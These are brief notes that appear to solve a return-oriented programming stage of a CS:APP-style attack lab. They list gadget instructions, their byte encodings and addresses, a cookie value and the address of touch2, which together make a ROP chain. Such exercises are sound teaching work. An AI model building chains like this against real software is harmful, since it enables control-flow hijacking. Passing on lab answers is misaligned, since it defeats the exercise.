
``` asm
pop %rax 

mov %rax %rdi

ret
```

pop %rax -> 58 0x4019ab 0x4019a7 + 4

59b997fa -> the value of cookie

movq %rax, %rdi -> 48 89 c7 movq %rax, %rdi 0x4019a0 + 2

ret -> touch2 4017ec

